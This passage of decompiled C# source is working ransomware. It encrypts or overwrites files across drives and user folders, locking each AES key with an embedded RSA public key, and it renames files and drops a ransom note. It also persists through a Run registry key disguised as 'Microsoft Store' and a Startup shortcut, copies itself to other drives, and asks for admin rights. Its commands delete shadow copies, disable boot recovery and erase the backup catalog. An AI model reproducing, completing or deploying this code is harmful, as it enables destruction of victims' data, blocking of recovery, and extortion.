					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>xlGXlTPeVp5YjcamTYRdQGZdjf6IbatxNKwld6U/hBLwmU3aGi2q56KXGcfMwnIXeoNmnuW6FilEuBZXN7ydNZP1bgnxffSHkiT69kgnp0Yakj79GwTX506xHDqM9jmRQ0gTdTls0antDA1GjBdu5w3s4MkGVzUMCd+QQikZ5kU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
